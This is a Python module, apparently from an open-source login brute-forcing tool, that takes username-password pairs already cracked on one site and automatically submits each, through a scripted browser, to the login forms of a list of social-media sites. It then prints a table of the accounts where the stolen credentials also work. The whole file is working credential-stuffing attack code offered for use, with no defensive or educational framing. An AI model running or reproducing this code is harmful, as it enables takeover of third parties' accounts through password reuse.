
from modules import loginbrute
import data, threading
from core.utils import printf, die, print_table
from core.tbrowser import startBrowser, parseLoginForm


try:
	from Queue import Queue
except ImportError:
	from queue import Queue

def do_job(jobs):
	for job in jobs:
		job.start()

	for job in jobs:
		job.join()
		
def submit(url, options, tryCreds, result):

	try:
		proc = startBrowser(options.timeout)

		printf("[+] Checking %s" %(url))

		proc.open(url)
		loginInfo = parseLoginForm(proc.forms())

	except Exception as err:
		if options.verbose:
			printf("[x] ReAuth: %s at %s" %(err, url), "bad")
		

	if not loginInfo:
		if options.verbose:
			printf("[x] ReAuth: Can't find login form at %s" %(url), "bad")
	else:
		try:
			options.url = url

			loginbrute.submit(
				# Reverse username + password. Dynamic submit in loginbrute
				options, loginInfo, tryCreds[-2:][::-1], result
			)
		except Exception as err:
			if options.verbose:
				printf("[x] ReAuth: Submitting error for %s" %(err), "bad")

def run(options, creds):
	social_urls = data.social_urls().replace("\t", "").split("\n")

	for url in social_urls:
		if options.url in url:
			social_urls.remove(url)


	result = Queue()
	#workers = []

	try:
		for tryCreds in creds:
			for url in social_urls:
				submit(url, options, tryCreds, result)

				# if len(workers) == options.threads:
				# 	do_job(workers)
				# 	del workers[:]

				# worker = threading.Thread(
				# 	target = submit,
				# 	args = (url, options, tryCreds, result)
				# )

				#worker.daemon = True
				#workers.append(worker)

		#do_job(workers)
		#del workers[:]
		
	
	except KeyboardInterrupt:
		printf("[x] Terminated by user!", "bad")
		import os
		os._exit(0)

	except SystemExit:
		die("[x] Terminated by system!", "SystemExit")
	
	except Exception as err:
		die("[x] ReAuth: Runtime error", err)
				
	finally:
		result = list(result.queue)

		if len(result) == 0:
			printf("[-] No extra valid password found", "bad")
		else:
			print_table(("Target", "Username", "Password"), *result)